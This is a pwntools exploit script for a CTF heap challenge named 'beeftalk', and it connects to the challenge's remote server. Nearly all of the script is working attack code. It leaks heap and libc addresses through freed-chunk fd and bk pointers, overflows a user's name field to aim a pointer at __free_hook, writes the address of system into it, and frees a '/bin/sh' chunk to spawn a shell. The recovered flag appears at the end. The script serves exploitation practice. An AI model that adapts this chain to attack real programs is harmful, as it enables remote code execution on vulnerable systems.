from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#r = process('./beeftalk')
r = remote('edu-ctf.zoolab.org', 30207)

cnt = 0
token_inuse = []
token_freed = []
heap_base_addr = None
libc_base_addr = None

def banner():
    r.recvuntil(":)")

def menu(opt):
    r.recvuntil("> ")
    r.sendline(opt)

def show_user():
    r.recvline()
    name = r.recvline().strip()[9:]
    global heap_base_addr
    if not heap_base_addr and b'L' in name:
        name += b'\x00'*(8-len(name))
        heap_base_addr = u64(name) - 0x34c
    global libc_base_addr
    if not libc_base_addr and b'LL' in name:
        name = name[8:] + b'\x00'*(8-len(name[8:]))
        libc_base_addr = u64(name) - 0x1ebc20
    print("Name:    ",name)
    print(r.recvline())
    print(r.recvline())
    print(r.recvline())
    print(r.recvline())
    r.recvline()

def login(token):
    r.recvline()
    r.sendline(token)
    if b'+' in r.recvline():
        return True
    else:
        return False

def signup(name, desc, job, money, y_n):
    global cnt
    if cnt>= 0x8:
        print("MAX user\n")
        return
    
    cnt += 1
    r.recvline()
    r.send(name)
    r.recvline()
    r.send(desc)
    r.recvline()
    r.send(job)
    r.recvline()
    r.send(money)
    show_user()
    r.recvline()
    r.sendline(y_n)
    if y_n == "y":
        global token_inuse
        global token_freed
        token = r.recvlineS().strip().split(' ')[-1]
        token_inuse.append(token)
        if token_freed:
            token_freed.pop(0)
    else:
        r.recvline()

def update(name, desc, job, money):
    r.recvuntil("> ")
    r.send(name)
    r.recvuntil("> ")
    r.send(desc)
    r.recvuntil("> ")
    r.send(job)
    r.recvuntil("> ")
    r.send(money)
    r.recvline()

def delete(token):
    r.recvuntil('> ')
    r.sendline("y")
    r.recvline()
    global cnt
    cnt -= 1
    global token_inuse
    global token_freed
    token_freed.append(token)
    token_inuse.remove(token)


# Banner
banner()
# Signup
menu("2")
signup("AAAAAAAA", "AAAAAAAA", "AAAAAAAA", "100", "y")
# Login
menu("1")
if login(token_inuse[0]):
    r.recvline()
# Delete
menu("3")
delete(token_inuse[0])
# Signup again
# The pointer of name will points to previous freed chunk of fifo1's fd
# And since the safe_read function won't append our input with "\x00"
# We can send one byte to partially overwrite the least signficant byte of fd
# but still leak the rest fd's value, which is enough for us to calculate heap base address
menu("2")
# L represents leak heap base address
signup("L", "AAAAAAAA", "AAAAAAAA", "200", "y")
menu("1")
# Clean up the users
if login(token_inuse[0]):
    r.recvline()
menu("3")
delete(token_inuse[0])


# Add 8 user with name length = 0x100
# After freeing all these members, we've some chunks in unsorted bin according to consolidation
for i in range(8):
    menu("2")
    signup("A"*0x100, "AAAAAAAA", "BBBBBBBB", str(i), "y")

for token in token_inuse.copy():
    print(token)
    menu("1")
    if login(token):
        r.recvline()
    menu("3")
    delete(token)


# Recover freed bins for information leakage
# Due to the size of name and asymmetrical malloc and free, some chunks are splitted into smaller chunks
# and thus cause some chunk to be in different entry of unsorted bins and small bins
# I found out that one can leak the bk of small bin by writing the first 8 byte of name
# and leave the rest 8 byte the same, which is the value of bk
for i in range(3):
    menu("2")
    signup("A"*0x8, "E"*0x10, "CCCCCCCC", str(i), "y")
menu("2")
signup("L"*0x8, "F"*0x40, "DDDDDDDD", "10", "y")

system_addr = libc_base_addr + elf.symbols['system']
__free_hook_addr = libc_base_addr + elf.symbols['__free_hook']


"""
free chunk 1
0x5604660ddb90: 0x00005604660dddb0      0x00007fb411ccbc70
0x5604660ddba0: 0x00005604660ddc30

free chunk 2
0x5604660dddc0: 0x00005604660ddfe0      0x00005604660ddb80
0x5604660dddd0: 0x00005604660dde60
"""
# free chunk 1's name can be overflowed to control the name pointer of free chunk 2
# To avoid corruption, remain everything with same value except the name pointer
# We can control the name pointer to point to any place we want to overwrite
menu("1")
if login(token_freed[0]):
    r.recvline()
payload = b"\x00"*8 + b'\xa1'+b'\x00'*7 + p64(__free_hook_addr)
menu("1")
update(payload, p64(libc_base_addr+0x1ebc60)[:-1], b'\x00', "10")
menu("4")

menu("1")
if login(token_freed[1]):
    r.recvline()
payload = p64(system_addr)
menu("1")
update(payload, b'\x00', b'\x00', "10")
menu("4")

# Create one more chunk whose name = /bin/sh\x00
menu("2")
signup(b'/bin/sh\x00', b'/bin/sh\x00', b'/bin/sh\x00', b'/bin/sh\x00', "y")
menu("1")
if login(token_inuse[-1]):
    r.recvline()
menu("3")
r.recv()
r.send('y')

r.interactive()
#FLAG{beeeeeeOwO}